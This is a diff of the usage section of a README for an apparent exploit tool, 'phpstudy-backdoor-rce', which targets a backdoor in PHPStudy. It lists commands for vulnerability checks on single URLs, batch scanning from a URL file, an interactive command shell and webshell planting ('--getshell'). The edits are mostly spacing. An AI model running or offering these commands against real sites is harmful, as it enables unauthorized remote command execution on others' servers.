@@ -26,25 +26,25 @@ pip install requests
 ![](https://github.com/theLSA/phpstudy-backdoor-rce/raw/master/demo/phpstudybd00.png)
 
 
-单url漏洞检测:python phpstudy-backdoor-rce.py -u "http://www.xxx.com/"
+单url漏洞检测: python phpstudy-backdoor-rce.py -u "http://www.xxx.com/"
 
 
 ![](https://github.com/theLSA/phpstudy-backdoor-rce/raw/master/demo/phpstudybd01.png)
 
 
-cmdshell:python phpstudy-backdoor-rce.py -u "http://www.xxx.com/" --cmdshell
+cmdshell: python phpstudy-backdoor-rce.py -u "http://www.xxx.com/" --cmdshell
 
 
 ![](https://github.com/theLSA/phpstudy-backdoor-rce/raw/master/demo/phpstudybd02.png)
 
 
-getshell:python phpstudy-backdoor-rce.py -u "http://www.xxx.com/" --getshell
+getshell: python phpstudy-backdoor-rce.py -u "http://www.xxx.com/" --getshell --web-path WWW
 
 
 ![](https://github.com/theLSA/phpstudy-backdoor-rce/raw/master/demo/phpstudybd03.png)
 
 
-批量检测:python phpstudy-backdoor-rce.py -f urls.txt
+批量检测: python phpstudy-backdoor-rce.py -f urls.txt
 
 
 ![](https://github.com/theLSA/phpstudy-backdoor-rce/raw/master/demo/phpstudybd04.png)
